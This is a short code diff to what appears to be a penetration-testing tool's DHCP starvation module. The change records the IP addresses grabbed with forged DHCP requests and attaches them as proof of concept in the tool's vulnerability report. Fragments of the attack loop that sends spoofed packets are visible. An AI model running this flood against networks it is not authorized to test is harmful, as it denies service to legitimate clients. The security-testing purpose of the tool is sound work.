@@ -12,7 +12,8 @@ def _run_starvation(ctx):
     """Run DHCP starvation attack"""
     ctx.out("Running DHCP starvation attack...", "WARNING", indent=4)
     ctx.out("Press Ctrl+C to stop", "INFO", indent=4)
-
+    obtained_ips = []
+    
     try:
         count = 0
         max_count = ctx.count if hasattr(ctx, 'count') and ctx.count else None
@@ -43,6 +44,7 @@ def _run_starvation(ctx):
                 sendp(prepare_request_packet(src_mac, transaction_id, requested_ip),
                       ctx.interface, verbose=False)
                 ctx.out(f"[+] Obtained {requested_ip} for {src_mac}", "OK", indent=4)
+                obtained_ips.append(requested_ip)
                 count += 1
             else:
                 ctx.out("[-] No OFFER received, server may be exhausted", "WARNING", indent=4)
@@ -54,7 +56,7 @@ def _run_starvation(ctx):
         ctx.out(f"[-] Error during starvation: {str(e)}", "ERROR", indent=4)
 
     ctx.out(f"[*] Total IPs obtained: {count}", "INFO", indent=4)
-    ctx.ptjsonlib.add_vulnerabiltiy("PTV-DHCP-STARVATION")
+    ctx.ptjsonlib.add_vulnerabiltiy("PTV-SVC-DHCP-STARV", poc={"obtained_ips": obtained_ips})
 
 def run(ctx):
     _run_starvation(ctx)
